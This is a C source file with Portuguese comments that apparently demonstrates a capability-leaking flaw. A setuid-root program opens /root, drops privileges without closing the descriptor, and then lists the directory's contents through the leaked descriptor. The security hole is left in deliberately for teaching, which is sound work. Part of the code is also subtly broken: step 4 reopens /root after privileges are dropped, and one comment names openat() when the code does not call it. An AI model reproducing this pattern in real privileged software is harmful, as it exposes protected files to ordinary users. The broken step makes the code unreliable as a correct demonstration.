#define _DEFAULT_SOURCE
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h> 
#include <string.h>

/*
 * Demonstração de exploração de Capability Leaking
 * 
 * Este programa demonstra como uma vulnerabilidade de capability leaking
 * permite que um utilizador normal aceda a diretorias protegidas (/root)
 * através de um file descriptor que foi aberto com privilégios elevados.
 * 
 * O programa deve ser compilado e executado com setuid root:
 *   gcc -o exploit exploit.c
 *   sudo chmod u+s exploit
 *   puis executar como utilizador normal: ./exploit
 */

int main() {
    int dfd;
    int uid_original = getuid();
    int euid_original = geteuid();
    
    printf("=== Demonstração de Capability Leaking Exploit ===\n");
    printf("UID real: %d\n", uid_original);
    printf("UID efetivo: %d\n", euid_original);
    printf("\n");
    
    // PASSO 1: Abrir /root com privilégios elevados
    printf("[PASSO 1] Abrindo /root com privilégios elevados...\n");
    dfd = open("/root", O_RDONLY);
    if (dfd == -1) {
        perror("open /root");
        exit(1);
    }
    printf("✓ /root aberto com sucesso! File descriptor: %d\n", dfd);
    printf("✓ Isto só foi possível porque o programa têm setuid root\n");
    printf("\n");
    
    // PASSO 2: Reduzir privilégios (VULNERABILIDADE: não fecha o FD)
    printf("[PASSO 2] Reduzindo privilégios do processo...\n");
    if (setuid(getuid()) == -1) {
        perror("setuid");
        exit(1);
    }
    printf("✓ Privilégios reduzidos com sucesso\n");
    printf("  UID agora: %d (utilizador normal)\n", getuid());
    printf("✓ MAS O FILE DESCRIPTOR AINDA ESTÁ ABERTO! (VULNERABILIDADE)\n");
    printf("\n");
    
    // PASSO 3: Explorar o file descriptor para listar /root
    printf("[PASSO 3] Utilizando openat() com o FD privilegiado para explorar /root...\n");
    printf("============================================================\n");
    printf("\n");
    
    DIR *dir = fdopendir(dfd);
    if (dir == NULL) {
        perror("fdopendir");
        exit(1);
    }
    
    struct dirent *entry;
    printf("Conteúdo de /root:\n");
    printf("  Tipo | Nome do Ficheiro\n");
    printf("  -----|------------------\n");
    
    while ((entry = readdir(dir)) != NULL) {
        char type = '?';
        if (entry->d_type == DT_DIR) type = 'D';
        else if (entry->d_type == DT_REG) type = 'F'; 
        else if (entry->d_type == DT_LNK) type = 'L';
        
        printf("  %c   | %s\n", type, entry->d_name);
    }
    
    closedir(dir);
    printf("============================================================\n");
    printf("\n");
    
    // PASSO 4: Demonstração adicional com fstatat
    printf("[PASSO 4] Obtendo informações de ficheiros em /root com fstatat()...\n");
    printf("\n");
    
    // Reabre o diretório para listar novamente
    dfd = open("/root", O_RDONLY);
    if (dfd == -1) {
        perror("reopen /root");
        exit(1);
    }
    
    dir = fdopendir(dfd);
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
            
        struct stat sb;
        if (fstatat(dfd, entry->d_name, &sb, 0) == 0) {
            printf("✓ %s: tamanho=%ld, modo=%o, uid=%d\n", 
                   entry->d_name, 
                   sb.st_size, 
                   sb.st_mode & 0777,
                   sb.st_uid);
        }
    }
    closedir(dir);
    
    printf("\n");
    printf("=== CONCLUSÃO ===\n");
    printf("⚠ VULNERABILIDADE EXPLORADA COM SUCESSO!\n");
    printf("Um utilizador normal conseguiu aceder a /root através do file descriptor\n");
    printf("que foi aberto quando o programa tinha privilégios elevados.\n");
    printf("\n");
    printf("FIX: O programa original deveria fazer close(dfd) antes de setuid()!\n");
    
    return 0;
}
